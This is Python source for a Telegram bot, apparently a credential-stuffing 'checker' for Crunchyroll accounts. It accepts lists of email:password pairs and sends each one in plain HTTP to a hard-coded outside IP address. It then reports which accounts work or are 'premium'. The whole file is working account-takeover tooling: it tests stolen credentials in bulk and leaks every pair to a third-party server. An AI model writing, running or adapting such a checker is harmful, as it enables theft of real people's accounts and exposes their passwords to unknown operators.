import telebot
import requests
import asyncio
from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# Initialize the bot with your token
bot_token = 'YOUR_BOT_TOKEN_HERE'
bot = AsyncTeleBot(bot_token)

# User-specific data storage
user_data = {}

# Start command to explain how to use the bot
@bot.message_handler(commands=['start'])
async def send_welcome(message):
    await bot.reply_to(message, "Welcome! Use the /crunchy command followed by email:pass pairs to make requests. For example:\n/crunchy email1:pass1\nemail2:pass2")

# Function to update the inline keyboard
async def update_inline_keyboard(chat_id, message_id, user_id):
    data = user_data.get(user_id, {'total': 0, 'good': 0, 'premium': 0, 'bad': 0})
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton(f"Total: {data['total']}", callback_data='total'))
    markup.add(InlineKeyboardButton(f"Good: {data['good']}", callback_data='good'))
    markup.add(InlineKeyboardButton(f"Premium: {data['premium']}", callback_data='premium'))
    markup.add(InlineKeyboardButton(f"Bad: {data['bad']}", callback_data='bad'))
    await bot.edit_message_reply_markup(chat_id=chat_id, message_id=message_id, reply_markup=markup)

# Function to process email:pass pairs asynchronously
async def process_pairs(message, pairs):
    user_id = message.from_user.id
    user_data[user_id] = {'total': len(pairs), 'good': 0, 'premium': 0, 'bad': 0}

    sent_message = await bot.send_message(message.chat.id, "Processing...")
    message_id = sent_message.message_id

    for pair in pairs:
        try:
            email, password = pair.split(':')
            # Make the request asynchronously
            url = f"http://31.172.87.218/c.php?e={email}&p={password}"
            response = requests.get(url)
            response_text = response.text.strip().lower()
            
            if "good" in response_text:
                user_data[user_id]['good'] += 1
                await bot.send_message(message.chat.id, f"Good: {email}:{password}\nResponse: {response.text}")
            elif "premium" in response_text:
                user_data[user_id]['premium'] += 1
                await bot.send_message(message.chat.id, f"Premium: {email}:{password}\nResponse: {response.text}")
            else:
                user_data[user_id]['bad'] += 1

            # Update the inline keyboard after each pair
            await update_inline_keyboard(message.chat.id, message_id, user_id)
        except ValueError:
            await bot.reply_to(message, f"Invalid format for: {pair}. It should be email:password.")

# Crunchy command to handle email:pass pairs
@bot.message_handler(commands=['crunchy'])
async def handle_crunchy(message):
    email_pass_pairs = message.text[len('/crunchy '):].strip().splitlines()
    await process_pairs(message, email_pass_pairs)

# Handling txt file
@bot.message_handler(content_types=['document'])
async def handle_document(message):
    try:
        file_info = await bot.get_file(message.document.file_id)
        file = await bot.download_file(file_info.file_path)
        email_pass_pairs = file.decode('utf-8').strip().splitlines()
        await process_pairs(message, email_pass_pairs)
    except Exception as e:
        await bot.reply_to(message, f"Failed to process file: {str(e)}")

# Start the bot
asyncio.run(bot.polling())
